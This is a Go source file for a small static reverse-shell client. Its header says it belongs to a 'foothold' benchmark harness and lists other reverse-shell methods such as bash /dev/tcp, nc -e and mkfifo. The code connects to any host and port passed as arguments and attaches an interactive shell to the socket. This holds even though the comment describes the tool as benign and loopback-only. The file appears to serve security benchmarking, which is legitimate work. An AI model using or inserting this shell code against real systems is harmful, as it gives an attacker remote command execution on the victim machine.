// Command revshell is the FALLBACK reverse-shell client for the Brig's contained foothold
// benchmark: a tiny, portable, static reverse shell used only when the target has no native
// technique the harness can discover (no bash+/dev/tcp, no nc -e, no nc+mkfifo, no python,
// perl, or socat). It connects back to a loopback listener and bridges a shell over the
// socket. It is benign and purpose-built; it exists so the foothold rung is not hardcoded to
// any one stack — the harness prefers the target's OWN tools and only delivers this when the
// box has nothing. Static linux/arm64 so it runs on a bare box.
//
// Usage: revshell HOST PORT [shell]   (shell defaults to /bin/sh)
package main

import (
	"net"
	"os"
	"os/exec"
	"time"
)

func main() {
	if len(os.Args) < 3 {
		os.Stderr.WriteString("usage: revshell HOST PORT [shell]\n")
		os.Exit(2)
	}
	host, port := os.Args[1], os.Args[2]
	shell := "/bin/sh"
	if len(os.Args) > 3 && os.Args[3] != "" {
		shell = os.Args[3]
	}
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 5*time.Second)
	if err != nil {
		os.Stderr.WriteString("revshell: dial: " + err.Error() + "\n")
		os.Exit(1)
	}
	defer conn.Close()
	cmd := exec.Command(shell, "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	_ = cmd.Run()
}
